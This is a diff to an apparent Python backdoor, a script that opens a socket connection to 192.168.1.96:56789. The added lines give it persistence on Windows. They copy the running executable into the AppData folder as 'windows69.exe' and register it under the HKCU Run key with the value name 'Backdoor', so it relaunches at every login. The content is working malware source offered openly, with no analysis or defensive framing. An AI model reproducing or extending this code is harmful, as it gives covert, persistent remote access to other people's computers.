@@ -5,6 +5,22 @@ import socket
 import subprocess
 import json
 import base64
+import os
+import shutil
+import sys
+
+
+location = os.environ["appdata"] + "\\windows69.exe"
+if not os.path.exists(location):
+	shutil.copyfile(sys.executable, location)
+	subprocess.call(
+		'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', 
+		shell=True
+	)
+
+
+
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("192.168.1.96", 56789))
